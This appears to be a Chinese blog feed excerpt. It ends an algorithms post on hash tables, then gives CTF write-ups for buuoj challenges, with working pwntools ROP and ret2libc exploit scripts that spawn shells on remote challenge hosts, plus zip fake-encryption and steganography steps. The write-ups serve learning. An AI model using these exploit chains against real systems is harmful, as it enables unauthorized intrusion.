class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> k=(x%N+N)%N;<br>    <span class="hljs-comment">//为什么x%N后还要加N，因为在c++中-10mod3=-1，所以要把负数映射到正数</span><br>    e[idx]=x;<span class="hljs-comment">//单链表求法</span><br>    ne[idx]=h[k];<br>    h[k]=idx++;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">bool</span> flag=<span class="hljs-literal">false</span>;<br>    <span class="hljs-type">int</span> k=(x%N+N)%N;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=h[k];i!=<span class="hljs-number">-1</span>;i=ne[i])<br>    &#123;<br>        <span class="hljs-keyword">if</span>(e[i]==x)&#123;<span class="hljs-comment">//找到后就可以返回查询结果</span><br>            flag=<span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> flag;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(h,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span> h);<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">int</span> x;<br>        string op;<br>        cin&gt;&gt;op&gt;&gt;x;<br>        <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;I&quot;</span>) <span class="hljs-built_in">insert</span>(x);<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">query</span>(x)) cout&lt;&lt;<span class="hljs-string">&quot;Yes&quot;</span>&lt;&lt;endl;<br>            <span class="hljs-keyword">else</span> cout&lt;&lt;<span class="hljs-string">&quot;No&quot;</span>&lt;&lt;endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="开放寻址法"><a href="#开放寻址法" class="headerlink" title="开放寻址法"></a>开放寻址法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">200003</span>,null=<span class="hljs-number">0x3f3f3f3f</span>;<span class="hljs-comment">//通常要比询问次数的范围大2-3倍，同时还是质数</span><br><span class="hljs-comment">//0x3f3f3f3f可以作为无穷大来比较</span><br><span class="hljs-type">int</span> h[N],n;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> k=(x%N+N)%N;<br>    <span class="hljs-keyword">while</span>(h[k]!=null&amp;&amp;h[k]!=x)<br>    &#123;<br>        k++;<br>        <span class="hljs-keyword">if</span>(k==N) k=<span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> k;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(h,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> h);<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        string op;<br>        <span class="hljs-type">int</span> x;<br>        cin&gt;&gt;op&gt;&gt;x;<br>        <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;I&quot;</span>)<br>        &#123;<br>            <span class="hljs-type">int</span> k=<span class="hljs-built_in">find</span>(x);<br>            h[k]=x;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span>(h[<span class="hljs-built_in">find</span>(x)]==null) cout&lt;&lt;<span class="hljs-string">&quot;No&quot;</span>&lt;&lt;endl;<br>            <span class="hljs-keyword">else</span> cout&lt;&lt;<span class="hljs-string">&quot;Yes&quot;</span>&lt;&lt;endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="字符串哈希表"><a href="#字符串哈希表" class="headerlink" title="字符串哈希表"></a>字符串哈希表</h2><p>(字符串哈希) O(n)+O(m)<br>全称字符串前缀哈希法，把字符串变成一个p进制数字（哈希值），实现不同的字符串映射到不同的数字。<br>对形如 X1X2X3⋯Xn−1Xn的字符串,采用字符的ascii 码乘上 P 的次方来计算哈希值。</p><p>映射公式 (X1×Pn−1+X2×Pn−2+⋯+Xn−1×P1+Xn×P0)modQ<br>注意点：</p><ol><li>任意字符不可以映射成0，否则会出现不同的字符串都映射成0的情况，比如A,AA,AAA皆为0</li><li>冲突问题：通过巧妙设置P (131 或 13331) , Q (264)(264)的值，一般可以理解为不产生冲突。</li></ol><p>问题是比较不同区间的子串是否相同，就转化为对应的哈希值是否相同。<br>求一个字符串的哈希值就相当于求前缀和，求一个字符串的子串哈希值就相当于求部分和。</p><p>前缀和公式 h[i+1]&#x3D;h[i]×P+s[i]h[i+1]&#x3D;h[i]×P+s[i] i∈[0,n−1]i∈[0,n−1] h为前缀和数组，s为字符串数组<br>区间和公式 h[l,r]&#x3D;h[r]−h[l−1]×Pr−l+1h[l,r]&#x3D;h[r]−h[l−1]×Pr−l+1<br>区间和公式的理解: ABCDE 与 ABC 的前三个字符值是一样，只差两位，<br>乘上 P2P2 把 ABC 变为 ABC00，再用 ABCDE - ABC00 得到 DE 的哈希值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ull;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>,P=<span class="hljs-number">131</span>;<br><span class="hljs-type">char</span> str[N];<br>ull p[N],h[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get_val</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> h[r]-h[l<span class="hljs-number">-1</span>]*p[r-l+<span class="hljs-number">1</span>];<br>    <span class="hljs-comment">//利用求区间和的思想，但是h[l-1]位次比h[r]低，所以需要将h[l-1]左移</span><br>    <span class="hljs-comment">//比如h[l-1]=AB,h[r]=ABCD,那么h[l-1]*p[r-l+1]就相当于ABCD-AB00=CD</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,str+<span class="hljs-number">1</span>);<br>    p[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        p[i]=p[i<span class="hljs-number">-1</span>]*P;<span class="hljs-comment">//求出每项的系数是多少</span><br>        h[i]=h[i<span class="hljs-number">-1</span>]*P+str[i];<span class="hljs-comment">//前缀和思想这个可以理解成2*5^n-1+3*5^n-2……</span><br>    &#125;<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-type">int</span> l1,r1,l2,r2;<br>        cin&gt;&gt;l1&gt;&gt;r1&gt;&gt;l2&gt;&gt;r2;<br>        <span class="hljs-comment">//判断两个字符串的哈希值是否相同，如果相同代表字符串完全相同</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">get_val</span>(l1,r1)==<span class="hljs-built_in">get_val</span>(l2,r2)) cout&lt;&lt;<span class="hljs-string">&quot;Yes&quot;</span>&lt;&lt;endl;<br>        <span class="hljs-keyword">else</span> cout&lt;&lt;<span class="hljs-string">&quot;No&quot;</span>&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>算法学习</tag>
      
      <tag>acwing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>misc做题记录</title>
    <link href="/2022/04/27/ctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/04/27/ctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h1><p><img src="https://s2.loli.net/2022/04/14/OTQlVcSKtNMdPZy.png" alt="屏幕截图 2022-04-14 193737"></p><p>checksec后发现是64位NX_ENABLE的程序，打开ida后发现就是一个简单的64位rop，题目用意应该是让我们熟悉下64位和32位rop构造的区别</p><p><img src="https://s2.loli.net/2022/04/14/AaHvI6ojXcSw2rU.png" alt="屏幕截图 2022-04-14 193819"></p><p>在64位中，函数传参通过寄存器，所以可以在函数找到pop_rdi_ret的地址，然后就可以把str_bin_sh传入system函数中</p><p><img src="https://s2.loli.net/2022/04/14/8RDOc6aQ9xekJtW.png" alt="屏幕截图 2022-04-14 193748"></p><p>于是exp可以这样构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28168</span>)<br>elf=ELF(<span class="hljs-string">&quot;./level2_x64&quot;</span>)<br>sys_plt=elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br>pop_rdi_ret=<span class="hljs-number">0x004006b3</span><br>bin_addr=<span class="hljs-number">0x00600A90</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">128</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi_ret)+p64(bin_addr)+p64(sys_plt)<br>a.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>a.send(payload)<br>a.interactive()<br></code></pre></td></tr></table></figure><h1 id="buuoj-not-the-Same"><a href="#buuoj-not-the-Same" class="headerlink" title="buuoj not_the_Same"></a>buuoj not_the_Same</h1><p>这道题我想简单了，我以为是只要利用gets漏洞将get_Secret的地址传入进去就可以了，没想到get_secret函数就是将flag的内容计入到了fl4g，需要利用write函数或者printf函数，看了wp才解出来，就当作学习了</p><p><img src="https://s2.loli.net/2022/04/14/2IMp4ozUTSZd6hR.png" alt="屏幕截图 2022-04-14 204035"></p><p>先checksec一下发现是32位开了NX_ENABLE的程序，不是64位相对写rop简单了点，看主函数发现有gets函数，可以栈溢出，将返回地址改到get_secret函数，然后再用writ函数输出就行了</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27886</span>)<br>elf=ELF(<span class="hljs-string">&quot;./not_the_same_3dsctf_2016&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">45</span>+p32(<span class="hljs-number">0x080489E0</span>)+p32(elf.sym[<span class="hljs-string">&quot;write&quot;</span>])+<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(<span class="hljs-number">1</span>)+p32(<span class="hljs-number">0x080ECA2D</span>)+p32(<span class="hljs-number">100</span>)<br><span class="hljs-comment">#第一个是get_secret函数的地址，第二个是当get_secret函数结束后的返回地址，第三个是当write函数结束后的返回地址，然后再是write函数参数地址</span><br><span class="hljs-comment">#write函数第一个参数是文件描述符，write默认为1</span><br><span class="hljs-comment">#第二个参数是将要输出的内容的地址</span><br><span class="hljs-comment">#第三个参数是将要输出内容的长度</span><br>a.send(payload)<br>a.interactive()<br><br></code></pre></td></tr></table></figure><p>wp的第二种解法是用printf函数的返回地址来打出fl4g，但是要注意的点是，使用printf来返回flag的值时要返回程序正常结束的地址</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *    <span class="hljs-comment">#导入pwntools中的pwn包的所有内容</span><br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-string">&#x27;26732&#x27;</span>)<br>fl4g=<span class="hljs-number">0x080ECA2D</span><br><br>backdoor_addr=<span class="hljs-number">0x80489a0</span><br>printf_addr=<span class="hljs-number">0x0804F0A0</span><br>exi=<span class="hljs-number">0x804E660</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2d</span><br>payload += p32(backdoor_addr)     <span class="hljs-comment">#gets栈溢出ret到get_secret</span><br>payload += p32(printf_addr)       <span class="hljs-comment">#执行完get_secret后的返回地址</span><br>payload += p32(exi)               <span class="hljs-comment">#执行完printf后的返回地址</span><br>payload += p32(fl4g)              <span class="hljs-comment">#printf打印的内容</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="buuoj-ciscn-2019-n-5"><a href="#buuoj-ciscn-2019-n-5" class="headerlink" title="buuoj ciscn_2019_n_5"></a>buuoj ciscn_2019_n_5</h1><p><img src="https://s2.loli.net/2022/04/17/k6HaTSrvz2GAQsp.png" alt="屏幕截图 2022-04-17 195444"></p><p>记得程序里面是puts，有回车所以在接受的时候要recv(“?\n”)才行，容易错</p><p>exp:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++">from pwn <span class="hljs-keyword">import</span> *<br>from LibcSearcher <span class="hljs-keyword">import</span> *<br>a=<span class="hljs-built_in">remote</span>(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25155</span>)<br>elf=<span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;./ciscn_2019_n_5&quot;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>a.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;e&quot;</span>)<br>a.<span class="hljs-built_in">sendline</span>(b<span class="hljs-number">&#x27;1&#x27;</span>)<br>a.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;?\n&quot;</span>)<br>payload1=b<span class="hljs-number">&#x27;</span>a<span class="hljs-number">&#x27;</span>*<span class="hljs-number">0x28</span>+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0x00400713</span>)+<span class="hljs-built_in">p64</span>(puts_got)+<span class="hljs-built_in">p64</span>(puts_plt)+<span class="hljs-built_in">p64</span>(main_addr)<br>a.<span class="hljs-built_in">sendline</span>(payload1)<br>puts_addr=<span class="hljs-built_in">u64</span>(a.<span class="hljs-built_in">recv</span>(<span class="hljs-number">7</span>)[:<span class="hljs-number">-1</span>].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-number">&#x27;</span>\x00<span class="hljs-number">&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc=<span class="hljs-built_in">LibcSearcher</span>(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>libcbase=puts_addr-libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sys_addr=libcbase+libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_addr=libcbase+libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>a.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;e&quot;</span>)<br>a.<span class="hljs-built_in">sendline</span>(b<span class="hljs-number">&#x27;1&#x27;</span>)<br>a.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;?\n&quot;</span>)<br>payload2=b<span class="hljs-number">&#x27;</span>a<span class="hljs-number">&#x27;</span>*<span class="hljs-number">0x28</span>+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0x004004c9</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0x00400713</span>)+<span class="hljs-built_in">p64</span>(bin_addr)+<span class="hljs-built_in">p64</span>(sys_addr)<br>a.<span class="hljs-built_in">sendline</span>(payload2)<br>a.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h1 id="buuoj-other-shellcode"><a href="#buuoj-other-shellcode" class="headerlink" title="buuoj other_shellcode"></a>buuoj other_shellcode</h1><p><strong>图片没上传成功</strong></p><p>![屏幕截图 2022-04-21 131917](E:\屏幕截图\屏幕截图 2022-04-21 131917.png)</p><p>看题目发现已经集成好了shellcode，于是只要连接上服务器就可以得到flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">09065662</span>-c02a-<span class="hljs-number">44</span>d1-<span class="hljs-number">9</span>d68-<span class="hljs-number">7</span>c29d1144450&#125;<br></code></pre></td></tr></table></figure><h1 id="buuoj-面具下的flag"><a href="#buuoj-面具下的flag" class="headerlink" title="buuoj 面具下的flag"></a>buuoj 面具下的flag</h1><p>下载题目后发现是图片，先试了下用stegsolve试了下有没有LSB隐写，发现没有。于是又用binwalk开试，发现有藏zip，于是用binwalk提取出来</p><p><img src="https://s2.loli.net/2022/04/27/XEH3a2RJAms1KLq.png" alt="屏幕截图 2022-04-27 203023"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">binwalk -e mianju<span class="hljs-selector-class">.jpg</span> <span class="hljs-attr">--root-as</span>=<span class="hljs-built_in">root</span>(因为binwalk需要以root身份运行所以需要加这句)<br></code></pre></td></tr></table></figure><p>提取出来后得到zip文件发现是伪加密（更改尾部的09 00 为00 00），用winhex改后可以提出flag.vmdk文件，vmdk文件可以用7z解压出来</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs maxima">zip伪加密方法<br>压缩源文件数据区： <br><br><span class="hljs-number">50</span> 4B <span class="hljs-number">03</span> <span class="hljs-number">04</span>：这是头文件标记（<span class="hljs-number">0x04034b50</span>） <br><span class="hljs-number">14</span> <span class="hljs-number">00</span>：解压文件所需 pkware 版本 <br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：全局方式位标记（有无加密） <br><span class="hljs-number">08</span> <span class="hljs-number">00</span>：压缩方式 <br>5A 7E：最后修改文件时间 <br>F7 <span class="hljs-number">46</span>：最后修改文件日期 <br><span class="hljs-number">16</span> B5 <span class="hljs-number">80</span> <span class="hljs-number">14</span>：CRC-<span class="hljs-number">32</span>校验（<span class="hljs-number">1480B516</span>） <br><span class="hljs-number">19</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：压缩后尺寸（<span class="hljs-number">25</span>） <br><span class="hljs-number">17</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：未压缩尺寸（<span class="hljs-number">23</span>） <br><span class="hljs-number">07</span> <span class="hljs-number">00</span>：文件名长度 <br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：扩展记录长度 <br>6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 <br><br><br>压缩源文件目录区： <br><br><span class="hljs-number">50</span> 4B <span class="hljs-number">01</span> <span class="hljs-number">02</span>：目录中文件文件头标记(<span class="hljs-number">0x02014b50</span>) <br>3F <span class="hljs-number">00</span>：压缩使用的 pkware 版本 <br><span class="hljs-number">14</span> <span class="hljs-number">00</span>：解压文件所需 pkware 版本 <br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：全局方式位标记（有无加密，这个更改这里进行伪加密，改为<span class="hljs-number">09</span> <span class="hljs-number">00</span>打开就会提示有密码了） <br><span class="hljs-number">08</span> <span class="hljs-number">00</span>：压缩方式 <br>5A 7E：最后修改文件时间 <br>F7 <span class="hljs-number">46</span>：最后修改文件日期 <br><span class="hljs-number">16</span> B5 <span class="hljs-number">80</span> <span class="hljs-number">14</span>：CRC-<span class="hljs-number">32</span>校验（<span class="hljs-number">1480B516</span>） <br><span class="hljs-number">19</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：压缩后尺寸（<span class="hljs-number">25</span>） <br><span class="hljs-number">17</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：未压缩尺寸（<span class="hljs-number">23</span>） <br><span class="hljs-number">07</span> <span class="hljs-number">00</span>：文件名长度 <br><span class="hljs-number">24</span> <span class="hljs-number">00</span>：扩展字段长度 <br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：文件注释长度 <br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：磁盘开始号 <br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：内部文件属性 <br><span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：外部文件属性 <br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：局部头部偏移量 <br></code></pre></td></tr></table></figure><p>！！！！！</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">7</span>z <span class="hljs-keyword">x</span> flag.vmdk -o./<br></code></pre></td></tr></table></figure><p>提取出来后发现是brainfuck加密</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;<br>++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ----- --.&lt;+ +++[- &gt;----<br>&lt;]&gt;-- ----- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +++++ .&lt;+++ +[-&gt;- ---&lt;] &gt;-.&lt;+ +++++ [-&gt;++<br>++++&lt; ]&gt;+++ +++.&lt; +++++ [-&gt;-- ---&lt;] &gt;---- -.+++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.<br>Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? 